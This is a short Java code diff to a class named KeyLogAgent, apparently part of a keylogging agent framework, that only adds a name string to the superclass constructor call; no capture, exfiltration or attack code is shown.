@@ -8,7 +8,7 @@ public class KeyLogAgent extends Agent {
     static Debug debug = new Debug("KeyLogAgent", DebugLevel.VERBOSE);
 
     public KeyLogAgent(boolean agentStatus) {
-        super(Agent.AGENT_KEYLOG, agentStatus, true);
+        super(Agent.AGENT_KEYLOG, agentStatus, true, "KeyLogAgent");
 
     }
 
